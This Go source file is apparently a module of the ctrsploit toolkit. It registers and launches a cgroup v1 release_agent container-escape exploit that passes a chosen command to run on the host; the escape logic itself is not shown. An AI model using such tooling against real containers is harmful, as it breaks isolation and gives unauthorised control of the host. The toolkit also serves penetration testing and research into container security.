package cgroup_mount_bypass_cgroupv1_release_agent

import (
	"fmt"
	"github.com/ctrsploit/sploit-spec/pkg/log"
	"github.com/docker/docker/pkg/reexec"
	"github.com/pkg/errors"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
)

const ExpName = "cgroup_mount-bypass-cgroupv1-release_agent"

func init() {
	reexec.Register(ExpName, Exploit)
}

func InvokeExploit(cmdOnHost string, debug bool, unknownRootfs bool) (err error) {
	log.Logger.Debug("start")
	//_, w, _ := os.Pipe()
	debugArg := "--debug"
	if !debug {
		debugArg += "=false"
	}
	unknownRootfsArg := "--unknown_rootfs"
	if !unknownRootfs {
		unknownRootfsArg += "=false"
	}
	cmd := reexec.Command(ExpName, debugArg, unknownRootfsArg, "--cmd", cmdOnHost)
	log.Logger.Debug("call ", cmd.Args)
	//errBuff := bytes.NewBuffer(nil)
	//cmd.Stderr = errBuff
	cmd.Stderr = os.Stderr
	//reader, writer := io.Pipe()
	//cmd.Stdout = writer
	cmd.Stdout = os.Stdout
	//cmd.ExtraFiles = append(cmd.ExtraFiles, w)

	//if err := cmd.Start(); err != nil {
	if err := cmd.Run(); err != nil {
		err = errors.Wrap(err, fmt.Sprintf("%s error on re-exec cmd", ExpName))
		awesome_error.CheckErr(err)
		//return reader, err
		return err
	}
	//go func() {
	//	err := cmd.Wait()
	//	err = errors.Wrapf(err, "error on exploit %s: %s", ExpName, errBuff)
	//	writer.CloseWithError(err)
	//}()
	log.Logger.Debug("end")
	return
}
